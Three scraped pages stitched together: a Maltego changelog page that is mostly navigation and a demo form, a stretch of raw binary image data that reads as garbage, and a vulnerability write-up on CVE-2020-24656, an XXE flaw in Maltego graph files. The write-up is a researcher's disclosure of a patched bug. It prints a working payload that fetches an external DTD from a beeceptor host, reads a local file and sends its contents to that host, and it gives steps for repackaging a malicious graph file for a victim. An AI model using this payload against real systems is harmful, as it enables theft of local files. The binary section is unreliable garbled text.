=== Content from www.maltego.com_c68b84a3_20250119_115844.html ===


[![Logo of Maltego Technologies](/img/maltego-logo.svg)](/)
![](/img/icons/hamburger.svg)

* [PRICING](https://www.maltego.com/pricing/)
* Capabilities
  + [Maltego Graph](https://www.maltego.com/graph/)
  + [Maltego Search](https://www.maltego.com/search)
  + [Maltego Monitor](https://www.maltego.com/monitor)
  + [Maltego Evidence](https://www.maltego.com/evidence)
  + [Maltego Data](https://www.maltego.com/maltego-data/)
* Resources
  + [Create an account](https://login.maltego.com/registration)
  + [Download Maltego](https://www.maltego.com/downloads/)
  + [Maltego Academy](https://academy.maltego.com/?utm_content=top_menu)
  + [Blog, Case studies and Whitepapers](https://www.maltego.com/blog/)
  + [Webinars](https://www.maltego.com/webinars/)
  + [Data Partners](https://www.maltego.com/transform-hub/)
  + [For Resellers](https://www.maltego.com/reseller/)
* Industries
  + [Government](https://www.maltego.com/government/)
  + [Defense & National Security](https://www.maltego.com/defense-and-national-security/)
  + [Law Enforcement](https://www.maltego.com/law-enforcement)
  + [Cyber Threat Intelligence](https://www.maltego.com/solutions/cyber-threat-intelligence/)
  + [Banking](https://www.maltego.com/banking)
  + [Insurance](https://www.maltego.com/insurance)

* [PRICING](https://www.maltego.com/pricing/)
* Capabilities
  + [Maltego Graph](https://www.maltego.com/graph/)
  + [Maltego Search](https://www.maltego.com/search)
  + [Maltego Monitor](https://www.maltego.com/monitor)
  + [Maltego Evidence](https://www.maltego.com/evidence)
  + [Maltego Data](https://www.maltego.com/maltego-data/)
* Resources
  + [Create an account](https://login.maltego.com/registration)
  + [Download Maltego](https://www.maltego.com/downloads/)
  + [Maltego Academy](https://academy.maltego.com/?utm_content=top_menu)
  + [Blog, Case studies and Whitepapers](https://www.maltego.com/blog/)
  + [Webinars](https://www.maltego.com/webinars/)
  + [Data Partners](https://www.maltego.com/transform-hub/)
  + [For Resellers](https://www.maltego.com/reseller/)
* Industries
  + [Government](https://www.maltego.com/government/)
  + [Defense & National Security](https://www.maltego.com/defense-and-national-security/)
  + [Law Enforcement](https://www.maltego.com/law-enforcement)
  + [Cyber Threat Intelligence](https://www.maltego.com/solutions/cyber-threat-intelligence/)
  + [Banking](https://www.maltego.com/banking)
  + [Insurance](https://www.maltego.com/insurance)

[![](/img/v3/icons/user.svg)

Sign In](https://app.maltego.com/)
[Get a Demo](/get-a-demo/)

* [PRICING](https://www.maltego.com/pricing/)
* Capabilities
  + [Maltego Graph](https://www.maltego.com/graph/)
  + [Maltego Search](https://www.maltego.com/search)
  + [Maltego Monitor](https://www.maltego.com/monitor)
  + [Maltego Evidence](https://www.maltego.com/evidence)
  + [Maltego Data](https://www.maltego.com/maltego-data/)
* Resources
  + [Create an account](https://login.maltego.com/registration)
  + [Download Maltego](https://www.maltego.com/downloads/)
  + [Maltego Academy](https://academy.maltego.com/?utm_content=top_menu)
  + [Blog, Case studies and Whitepapers](https://www.maltego.com/blog/)
  + [Webinars](https://www.maltego.com/webinars/)
  + [Data Partners](https://www.maltego.com/transform-hub/)
  + [For Resellers](https://www.maltego.com/reseller/)
* Industries
  + [Government](https://www.maltego.com/government/)
  + [Defense & National Security](https://www.maltego.com/defense-and-national-security/)
  + [Law Enforcement](https://www.maltego.com/law-enforcement)
  + [Cyber Threat Intelligence](https://www.maltego.com/solutions/cyber-threat-intelligence/)
  + [Banking](https://www.maltego.com/banking)
  + [Insurance](https://www.maltego.com/insurance)
* Get a demo
  [![](/img/v3/icons/user.svg)

  Sign In](https://app.maltego.com/)

![](/img/icons/done-24px.svg)
####

Close
[Back to home](/)

close

![](/img/icons/done-24px.svg)
####

Close
[Back to home](/)

close

![](/img/v3/demo-rating.svg)
4.5 rating
# Get Started with Maltego

## Please share your contact information for a personalized session.

Your Business Email \*

Get Started Now *arrow\_forward*

First Name \*

Last Name \*

Company Email \*

Phone Number \*
 DE +49
Albania +355
Algeria +213
Andorra +376
Angola +244
Anguilla +1264
Antigua And Barbuda +1268
Argentina +54
Armenia +374
Aruba +297
Australia +61
Austria +43
Azerbaijan +994
Bahamas +1242
Bahrain +973
Bangladesh +880
Barbados +1246
Belarus +375
Belgium +32
Belize +501
Benin +229
Bermuda +1441
Bhutan +975
Bolivia +591
Bosnia and Herzegovina +387
Botswana +267
Brazil +55
Brunei Darussalam +673
Bulgaria +359
Burkina Faso +226
Burundi +257
Cambodia +855
Cameroon +237
Canada +1
Cape Verde +238
Cayman Islands +1345
Central African Republic +236
Chile +56
China +86
Cote d'Ivoire +225
Colombia +57
Comoros +269
Congo +242
Cook Islands +682
Costa Rica +506
Croatia +385
Cuba +53
Cyprus +90392
Czech Republic +42
Denmark +45
Djibouti +253
Dominica +1809
Dominican Republic +1809
Ecuador +593
Egypt +20
El Salvador +503
Equatorial Guinea +240
Eritrea +291
Estonia +372
Ethiopia +251
Falkland Islands (Malvinas) +500
Faroe Islands +298
Fiji +679
Finland +358
France +33
French Guiana +594
French Polynesia +689
Gabon +241
Gambia +220
Georgia +995
Germany +49
Ghana +233
Gibraltar +350
Greece +30
Greenland +299
Grenada +1473
Guadeloupe +590
Guam +671
Guatemala +502
Guinea +224
Guinea-Bissau +245
Guyana +592
Haiti +509
Honduras +504
Hong Kong +852
Hungary +36
Iceland +354
India +91
Indonesia +62
Iran, Islamic Republic of +98
Iraq +964
Ireland +353
Israel +972
Italy +39
Jamaica +1876
Japan +81
Jordan +962
Kazakhstan +7
Kenya +254
Kiribati +686
Korea, Democratic People's Republic of +850
Korea, Republic of +82
Kuwait +965
Kyrgyzstan +996
Lao People's Democratic Republic +856
Latvia +371
Lebanon +961
Lesotho +266
Liberia +231
Libyan Arab Jamahiriya +218
Liechtenstein +417
Lithuania +370
Luxembourg +352
Macao +853
Macedonia, the former Yugoslav Republic of +389
Madagascar +261
Malawi +265
Malaysia +60
Maldives +960
Mali +223
Malta +356
Marshall Islands +692
Martinique +596
Mauritania +222
Mauritius +230
Mayotte +269
Mexico +52
Micronesia, Federated States of +691
Moldova, Republic of +373
Monaco +377
Mongolia +976
Montserrat +1664
Morocco +212
Mozambique +258
Myanmar +95
Namibia +264
Nauru +674
Nepal +977
Netherlands +31
New Caledonia +687
New Zealand +64
Nicaragua +505
Niger +227
Nigeria +234
Niue +683
Norfolk Island +672
Northern Mariana Islands +670
Norway +47
Oman +968
Pakistan +92
Palau +680
Panama +507
Papua New Guinea +675
Paraguay +595
Peru +51
Philippines +63
Poland +48
Portugal +351
Puerto Rico +1787
Qatar +974
Reunion +262
Romania +40
Russian Federation +7
Rwanda +250
San Marino +378
Sao Tome and Principe +239
Saudi Arabia +966
Senegal +221
Serbia +381
Seychelles +248
Sierra Leone +232
Singapore +65
Slovakia +421
Slovenia +386
Solomon Islands +677
Somalia +252
South Africa +27
Spain +34
Sri Lanka +94
Saint Helena +290
Saint Kitts and Nevis +1869
Saint Lucia +1758
Sudan +249
Suriname +597
Swaziland +268
Sweden +46
Switzerland +41
Syrian Arab Republic +963
Taiwan +886
Tajikistan +7
Thailand +66
Togo +228
Tonga +676
Trinidad and Tobago +1868
Tunisia +216
Turkey +90
Turkmenistan +993
Turks and Caicos Islands +1649
Tuvalu +688
Uganda +256
United Kingdom +44
Ukraine +380
United Arab Emirates +971
Uruguay +598
United States +1
Uzbekistan +7
Vanuatu +678
Holy See (Vatican City State) +379
Venezuela +58
Viet Nam +84
Virgin Islands, British +84
Virgin Islands, U.S. +84
Wallis and Futuna +681
Yemen +967
Zambia +260
Zimbabwe +263

Organization Name \*

Job Title \*

Organization size \*
Select
1-10
11-500
501-10000
 > 10000

Industry
Select
Aerospace & Defense
 Agribusiness
 Conglomerate
 Construction
 Education & Research
 Energy
 Financial Services
 Food, Beverage & Tobacco
 Government & Public Institutions
 Healthcare
 Hospitality
 Leisure & Entertainment
 Manufacturing
 Media & Telecommunications
 Mobility & Transportation
 Non Profit
 Other
 Retail
 Consulting & Specialized Services
 Technology

Business Role \*
Select Academic Representative Analyst/Investigator Data provider/Data Partner Other Procurement Manager Reseller Student Team Lead/Manager Trainer

Are you an active Maltego user?
Select
No, but interested in learning more about Maltego
Yes, Maltego Community edition or Kali
Yes, Maltego Pro
Yes, Maltego Enterprise
Yes, Maltego Classic or XL

Focus of Your Business Unit

Cyber Security Operations
Trust & Safety
Government

Main Use Cases

Incident Response
Penetration Testing
Threat Intelligence
Threat Hunting
Fraud Investigation
Product Abuse
Insider Threat
Person of Interest / Social Media
Investigation
Cyber Crime Investigation
Real-time monitoring
Public Safety / Public order

Please keep me updated about Maltego product updates,
news,
events,
and offers.

By clicking on "Submit", you agree to the processing of the data you entered and you allow us to contact you for the purpose selected in the form. For further information, see our Privacy Policy.

![](/img/icons/send-2.svg)
Submit

![](/img/green-light-check.svg)
## Thank you! We will contact you soon.

In the meantime, check out our [product overview](https://static.maltego.com/cdn/Case%20studies/Maltego-Platform-Deep-Dive.pdf)
 to learn more about the Maltego platform.

Schedule a personalized 30-minute demo to

 close

### Your browser doesn't support JavaScript. Certain features requires JavaScript to be enabled.

# Maltego Client Changelog

See all versions and the according changes.

Products & Pricing

* [Pricing](https://www.maltego.com/pricing/)
* [Maltego Graph](/graph/)
* [Maltego Search](/search/)
* [Maltego Monitor](/monitor/)
* [Maltego Evidence](/evidence/)
* [Maltego Data](/maltego-data/)
* [Channel Partners](https://www.maltego.com/reseller/)

Get Maltego

* [Download Maltego](https://www.maltego.com/downloads/)
* [Register for Community Edition](https://login.maltego.com/registration)
* [Reset Password for Community Edition](https://login.maltego.com/recovery)
* [Change Log](https://www.maltego.com/changelog/)
* [On Demand Demo](https://get.maltego.com/on-demand-demo)
* [Buy Online](https://store.maltego.com/)

Data Sources

* [Maltego Data](https://www.maltego.com/maltego-data/)
* [Connectors](https://www.maltego.com/transform-hub/)
* [Become a Data Partner](https://www.maltego.com/partner-signup/)

Company

* [About Us](https://www.maltego.com/about-us/#about-us)
* [Careers](https://www.maltego.com/about-us/#careers-at-maltego)
* [Press Mentions](https://www.maltego.com/press-mentions/)
* [Download logo](https://www.maltego.com/logo-downloads/)
* [Legal Documents](https://get.maltego.com/legal)

Resources

* [Documentation](https://docs.maltego.com/support/home/)
* [Get Support](https://docs.maltego.com/support/tickets/new)
* [Blog](https://www.maltego.com/blog/)
* [Maltego Grants](https://www.maltego.com/maltego-grants/)
* [FAQs](https://www.maltego.com/maltego-faq/)
* [Maltego Community](https://www.maltego.com/maltego-community/)

![](/img/v3/icons/security_trust.svg)

[![](/img/icons/social_media/color/twitter.svg)
![](/img/icons/social_media/twitter.svg)](https://twitter.com/MaltegoHQ)
[![](/img/icons/social_media/color/linkedin.svg)
![](/img/icons/social_media/linkedin.svg)](https://www.linkedin.com/company/maltego)
[![](/img/icons/social_media/color/youtube.svg)
![](/img/icons/social_media/youtube.svg)](https://www.youtube.com/c/MaltegoOfficial)
[![](/img/icons/social_media/color/spotify.svg)
![](/img/icons/social_media/spotify.svg)](https://open.spotify.com/show/2p3EP3hrcBWwVNFeo8877P)
[![](/img/icons/social_media/color/apple%20podcast.svg)
![](/img/icons/social_media/apple%20podcast.svg)](https://podcasts.apple.com/us/podcast/the-pivot/id1629913312)
[![](/img/icons/social_media/color/google%20podcast.svg)
![](/img/icons/social_media/google%20podcast.svg)](https://podcasts.google.com/feed/aHR0cHM6Ly9hbmNob3IuZm0vcy84YWIzNTQ5MC9wb2RjYXN0L3Jzcw?sa=X&ved=0CBsQ27cFahcKEwiQ0v3d1IL6AhUAAAAAHQAAAAAQCg&hl=en-DE)

© 2018-2025 by Maltego Technologies.
ISO 27001:2022 Certified

![](/img/v3/icons/security_trust.svg)

* [Legal Notice](https://www.maltego.com/legal-notice/)
* [License Agreement](https://www.maltego.com/license-agreement/)
* [Data Processing Agreement](https://www.maltego.com/data-processing-agreement/)
* [Data Privacy](https://www.maltego.com/data-privacy/)
* [Website Privacy](https://www.maltego.com/website-privacy/)
* [Cookie Policy](https://www.maltego.com/cookie-policy/)



=== Content from static.wixstatic.com_2437aef9_20250119_134339.html ===
RIFF0  WEBPVP8X
   (   w  J  ICCP�    �lcms  mntrRGB XYZ �      acspMSFT    sawsctrl              ��     �-hand�� =@��=@t,���"�                                desc   �   \_cprt     wtpt     rXYZ  ,   gXYZ  @   bXYZ  T   rTRC  h   `gTRC  h   `bTRC  h   `desc       uRGB            text    CC0 XYZ       �T    �XYZ       o�  8�  �XYZ       b�  ��  �XYZ       $�  �  ��curv       \*   | ��u��N
b���j. C$�)j.~3�9�?�FWM6Tv\dl�uV~��,�6�����۾����e�w����VP8L  /w� M0l�6����|Ng����e6%�7��Np�R�Q(��N@� ���"j�� ���rD�S
��vm۶-o1�L��XZ����ΐ�J��I�Z�/Q�RO�6�$�����0���i$ rt�n�����������1� EQُ$c�Q`��fQ�G0�3ly6MO��� f�����w�Y��(֥5?s�C�dk�\ J��� ?�����s�kme�5�a�e6�.Y $!�f4
��A �06� ���f0�   �B����}c��U&� �DI �B"x� ꋀ $ B��Y,
����4  A�B�X���AS�<0{�s�]'{��$ B��P
3/�0Þ��N]�� �(
!`���  ��ڳL&%��� ?��1& )Ef�  ?��   p�� �?�B  !��"� (|�)���P�x ��?�@0!0�HX�B��B� �T&>3l� ���w��@! �A�& @�1A�4���!@�(`�y�(��� @&�NQ0fdr��mE�B0w��o
TY�V4���XFj���332���  `t��k�4�!l
���65��@QVij#��Ҁh����0��$  ʚE%��1��\_��B�"Qi������rlM�0å��,~�@��C{�j��k�7�3l
��eUm�ɘ�3�b3B)���gǀ�!�2���I�2`0��i3�s��o���i#����L�������B`�^{�X��<�b�Uښ��ik��0x,(:k#�2�v JM#C���iYQ
��gؚ�X�A�P��ͩ�Nm�"� -������0kW�5Ͳ236[��hn�n�L��� 0C�F)�L&�Uma�`�f��f��b�F%؂ٵ����͖F&�1�H�=�l���s�fȈJQ�L��)��@l�@� �Dۺ�/f��e2d��,aY��
���L\*+� `͜�2�����B���f�b����s��\\<�
�c��g  e�2� @Y[ѰF&Tݶ��� �u �d!mL� =m`���  @�!�my�n��A �ak�fc�#7�e!�AdN�s��K�9T
�ܮX�
j�ֲ"� f�EۭYÈj\_�Oo�D!
B%؆`�0���(hVƪ�Ue� &Xf�4Ͳ�e
d@����u�&<�@&3�6�X���3cD��aE�2�����|� �����2A1�h�F � S��IVY[�@���xl��<��4"lN����1E����� B�0�V6�y�?@ @�<��YV� 4>�!|�F�� s�ɨ�ٍ3��`AmQ�F��k���(�B3!D�L)
3�6@�XT�6�P
0D�PI�9ʚ63�c��2Ś1���("c�KH'���9a P�(dh�"�(�`3�K��l�K[A�@ -;�#<�=C� 2XM�As�L�(�64�6�eafd��`��Q �P��ds�]?�XB��T���?H� HJ��99�� )��Y�,��\:9�.6 �8xwͻ���@ES&�01!dO�9�F�s�bnS�Q��{��MW�m����&4��  �,�0vq�[;88L1��9�I�,�Y&�#{��Ӻ$��h�l)�?����S�B MG��d���i�b�L�0�\aE�]��
��?+o��)d��
 �� �p�N��5�Ö:�ᚓ��Xv�lG�\_�7��
��\*����;6�)�7�[��ֈ06Qf\*M[!� U���`��%i��,3� �5m0��ϢX�(`2��jm�L���E��C{ ���+�<\_4cD!&(M��Il�@(�Є��ں�xA�hn�Y�k�
c�ʲEK �bqcJӴi��%+������������fq˟�w���DQ4Tf0�$@�఑ڊ0� Y�,�Q4U26���X���RD3C Rt�
� �m�b@4M���06a���2P�8l�����"� < Q� � �[���!���B �i @��
�5���q�LŢ(�!  �&@[�[#���� �A!�2���#� �B � m@��7�L`0!� �������|��  �\_  ��o  <� �� x 8�;9 ��W�f<ȧ� EXIF�   Exif  II\*                V       ^   (              i�    f       �\_ �  �\_ �    �    0210�      �    0100�    ��  �    x   �    K       

=== Content from www.hackersforchange.com_ebbc1cb8_20250119_115844.html ===


top of page![logo_size.jpg](https://static.wixstatic.com/media/474228_4187817777ae43b2b9263873820d09d7~mv2.jpg/v1/fill/w_69,h_64,al_c,q_80,usm_0.66_1.00_0.01,enc_avif,quality_auto/logo_size.jpg)

[HACKERS FOR CHANGE](https://www.hackersforchange.com)

* [Home](https://www.hackersforchange.com)
* [About](https://www.hackersforchange.com/about)
  + [Board of Directors](https://www.hackersforchange.com/board-of-directors)
  + [Executive Team](https://www.hackersforchange.com/executive-team)
  + [FAQ](https://www.hackersforchange.com/frequently-asked-questions)
  + [Contact Us](https://www.hackersforchange.com/contact-us)
  + [Our Mission](https://www.hackersforchange.com/our-mission)
  + [Partners](https://www.hackersforchange.com/our-clients)
  + [Store](https://www.hackersforchange.com/gift-shop)
  + [Careers](https://www.hackersforchange.com/careers)
* [Charities](https://www.hackersforchange.com/charities)
  + [Charity Registration Form](https://www.hackersforchange.com/client-intake)
* [Volunteers](https://www.hackersforchange.com/volunteers)
* [Research](https://www.hackersforchange.com/vulnerability-research)
  + [Disclosure Policy](https://www.hackersforchange.com/disclosurepolicy)
* [Blog](https://www.hackersforchange.com/blog)
* [Donate](https://www.hackersforchange.com/donations)
* More

Use tab to navigate through the menu items.

* [All Posts](https://www.hackersforchange.com/blog)
* [Cybersecurity](https://www.hackersforchange.com/blog/categories/cybersecurity)
* [Best Practices](https://www.hackersforchange.com/blog/categories/best-practices)
* [Vulnerability Research](https://www.hackersforchange.com/blog/categories/vulnerability-research)
* [Volunteering](https://www.hackersforchange.com/blog/categories/volunteering)
Search[![Writer's picture]()Hackers for Change](https://www.hackersforchange.com/profile/manraajmand/profile)Aug 27, 20205 min read
# Maltego CVE-2020-24656 Analysis

![](https://static.wixstatic.com/media/54a476_e5443ab7fa004757ad6a5cd89cf476a6~mv2.png/v1/fill/w_120,h_75,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_auto/54a476_e5443ab7fa004757ad6a5cd89cf476a6~mv2.png)

**What is Maltego?**

"Maltego is software used for open-source intelligence and forensics, developed by Paterva from Pretoria, South Africa. Maltego focuses on providing a library of transforms for discovery of data from open sources, and visualizing that information in a graph format, suitable for link analysis and data mining." - Wikipedia

To put it simply, Maltego facilitates forensic investigations for security researchers, law enforcement and intelligence alike.

**What's the problem?**

Hackers for Change's Director of Advisory, Dominik Penner, discovered that Maltego versions 4.2.11 and below are vulnerable to XML external entity (XXE) injection via processing of MTZ (config) and MTGL (graph) files. These types of vulnerabilities can have a range of consequences, such as:

* [Information disclosure](https://www.netsparker.com/blog/web-security/information-disclosure-issues-attacks/)
* [Code execution](https://www.netsparker.com/blog/web-security/remote-code-evaluation-execution/) (via [SSRF](https://medium.com/%40madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978))
* [Denial of service](https://www.f-secure.com/v-descs/articles/denial-of-service.shtml)

In this particular instance, the vulnerability allows an attacker to exfiltrate local files on a victims computer.

In more targeted and complex scenarios an attacker may be able to leverage SSRF to yield code execution on the victim's computer, or another computer on the victim's network. This is typically limited to specific network/device configurations and generally requires familiarity with the victim's local area network (LAN).

**The issue with external entities**

In order to fully understand the danger of external entities, it's important to first understand what an entity even is. Entities are XML variables that can be referenced by the application. Developers use entities to define values, and use said values in future code.

Entity Example:

In this example, the "Message" tag contents will be populated by the "hello" entity we just defined.

So then what are **external entities**?

They're basically the same thing, however they allow you to define entities with external data, whereas with normal entities, you have to explicitly define the data being stored.

To create an external entity, we can use the "SYSTEM" keyword, followed by a URL, which will instruct the application to fetch the content from that external resource.

External Entity Example:

This snippet will fetch contents from the supplied URL and store them in the "hello" entity. The cool thing about external entities is that you aren't restricted to "external" resources.

By using different URI protocols, we can interact with other resources. If we want to read a local file on the server, we can use the following URI.

```
file:///etc/passwd
```

Now that we have gotten those file contents stored in a variable, we can setup another external entity to send a request to our malicious server with the contents. Once the request is sent to our server, we can check our access logs and observe the file contents.

**Exploit overview**

In order for an attacker to successfully exploit this vulnerability, they would need to convince a victim to open a MTZ or MTGL file within Maltego. This is pretty common as Maltego utilizes these files to share content between multiple instances.

For example, MTGL / MTGX files are essentially project files, which can populate a Maltego client with an existing project.

MTZ files, however, are strictly for configurations, such as new transforms, new entities, etc.

**Technical overview**

For this example we will use a graph file because those are the most inconspicuous and are frequently shared among other people. The first step is to create an empty graph file, and drag an entity into the view. Once that's done, we can save it and start tweaking things within the MTGL.

The first thing I noticed with MTGL/MTZ files, was that they're actually just a bunch of XML and properties files compressed into a ZIP archive. This makes "reverse engineering" Maltego's file formats very easy.

The structure of a Maltego graph file looks something similar to this:

![](https://static.wixstatic.com/media/54a476_cbde677f4ed34f928c9348e1caa0caee~mv2.png/v1/fill/w_49,h_36,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_auto/54a476_cbde677f4ed34f928c9348e1caa0caee~mv2.png)

The idea here is that we're going to modify one of the XML files and add our payload, then repackage the MTGL to send off to the target.

In this example we'll modify one of the entities, which, by default looks like the following:

**maltego.Device.entity**

Realistically all we need to do is add our payload, then have it reference another external payload which will be responsible for the exfiltration.

**maltego.Device.entity**

**lol.dtd**

For testing purposes, I used [beeceptor.com,](http://beeceptor.com) which is primarily used for REST API mocking. Beeceptor allows you to set up mock API rules, essentially allowing us to host our payload there.

At a high level, here's how the payload works. First, we set up an entity that grabs the payload from the supplied URL.

```
<!ENTITY % djp SYSTEM "https://sfhetjrtjyr.free.beeceptor.com/lol.dtd">
```

Then, in the **lol.dtd** file, we set up another entity grabbing contents from a local file.

```
<!ENTITY % data SYSTEM "file:///etc/subuid">
```

Then finally, we define another entity, which will send a request with the contents of the OTHER entity we created. Essentially exfiltrating the file.

```
<!ENTITY % pwn "<!ENTITY exfil SYSTEM 'https://sfhetjrtjyr.free.beeceptor.com/?%data;'>">
```

Now, when Maltego tries to render the entity, the sample value is set to:

```
<SampleValue>&exfil;</SampleValue>

```

Which will call our "exfil" entity, ultimately evaluating our payloads instantly when the graph file is rendered ;)

**Tying it all together**

Now that we have an understanding of how it all works, we can go ahead and test it. Simply create a graph file as instructed in the technical overview. Once that's done, we can go ahead and extract the archive.

```
unzip graph.mtgl
```

Now we can modify the "**Entities/maltego.Device.entity"** file, with the following contents:

We also have to setup the rule on beeceptor in order for the payload to fetch the "**lol.dtd**" file.

![](https://static.wixstatic.com/media/54a476_cb159084cc1d47c3a6bc97ba342c63b7~mv2.png/v1/fill/w_49,h_13,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_auto/54a476_cb159084cc1d47c3a6bc97ba342c63b7~mv2.png)

Set up the rule so that the GET request to **lol.dtd** serves the following content:

```
<!ENTITY % data SYSTEM "file:///etc/subuid">
<!ENTITY % pwn "<!ENTITY exfil SYSTEM 'https://sfhetjrtjyr.free.beeceptor.com/?%data;'>">
```

Now that we've done all the setup, all we have to do is repackage the MTGL file, and send it off.

```
zip -r payload.mtgl ./*
```

A tree view of the MTGL file looks like this:

```
dom@kde:~/TEST$ tree
.
├── Entities
│   └── maltego.Device.entity
├── Graphs
│   ├── Graph1
│   │   ├── Collection
│   │   │   └── collection-nodes.data
│   │   ├── DataEntities
│   │   │   ├── _1_1.liv
│   │   │   ├── _1.cfe
│   │   │   ├── _1.cfs
│   │   │   ├── _1.si
│   │   │   └── segments_1
│   │   ├── DataLinks
│   │   │   └── segments_1
│   │   ├── LayoutEntities
│   │   │   ├── _0.cfe
│   │   │   ├── _0.cfs
│   │   │   ├── _0.si
│   │   │   └── segments_1
│   │   ├── LayoutLinks
│   │   │   └── segments_1
│   │   ├── StructureEntities
│   │   │   ├── _4_1.liv
│   │   │   ├── _4.cfe
│   │   │   ├── _4.cfs
│   │   │   ├── _4.si
│   │   │   └── segments_1
│   │   └── StructureLinks
│   │       └── segments_1
│   └── Graph1.properties
├── Icons
│   └── Technology
│       ├── RemoteControl24.png
│       ├── RemoteControl32.png
│       ├── RemoteControl48.png
│       ├── RemoteControl96.png
│       ├── RemoteControl.png
│       └── RemoteControl.xml
└── version.properties
```

**The moment of truth...**

Let's open up the payload.mtgl file we just generated in Maltego, and see if we get any results.

Success.

**Conclusion**

Hackers for Change extends a huge thanks to the Maltego team for addressing the issue so quickly. As of version 4.2.12, this issue has been patched, so be sure to update!

Due to the fact that MTGL and MTZ files are quite often shared among collaborators and third-parties, the chances of someone falling victim to this vulnerability is relatively high.

While I haven’t discovered a reliable way to escalate to code execution, it’s possible to exfiltrate local files, which may or may not contain secrets that can be used to get further access. Targeted attacks could lead to leaking private keys among other sensitive files.

If a Maltego client was being run on an internal network, this vulnerability would also open up the door to more promising SSRF attacks, which could compromise the network through a variety of attacks depending on infrastructure.

* [Vulnerability Research](https://www.hackersforchange.com/blog/categories/vulnerability-research)
3,132 views50 likes. Post not marked as liked50
## Recent Posts

[See All](https://www.hackersforchange.com/blog)[![]()](https://www.hackersforchange.com/post/arctosdb-oracle-sql-injection-harvard)

[ArctosDB Oracle SQL Injection & Harvard](https://www.hackersforchange.com/post/arctosdb-oracle-sql-injection-harvard)

1,33031 likes. Post not marked as liked31[![]()](https://www.hackersforchange.com/post/the-cadence-does-not-stop)

[The Cadence Does Not Stop](https://www.hackersforchange.com/post/the-cadence-does-not-stop)

1,51348 likes. Post not marked as liked48![Long-form-white-transparent_3.png](https://static.wixstatic.com/media/c1d2d8_2a8d56a2743045f9a22d5e053b5a5084~mv2.png/v1/fill/w_79,h_27,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/Long-form-white-transparent_3.png)

[ABOUT US](https://www.hackersforchange.com/about)

[CONTACT](https://www.hackersforchange.com/contact-us)

[FAQ](https://www.hackersforchange.com/frequently-asked-questions)

[DONATE](https://www.hackersforchange.com/donations)

© 2021 Hackers for Change | All Rights Reserved

[Privacy Policy](https://www.hackersforchange.com/privacy-policy)

STAY CONNECTED:

* [![Twitter]()](https://twitter.com/hackerschange)
* [![Instagram]()](https://www.instagram.com/hackersforchange)
* [![Facebook]()](https://www.facebook.com/Hackers-For-Change-109124467494539/)
* [![LinkedIn]()](https://www.linkedin.com/company/54105554)
bottom of page


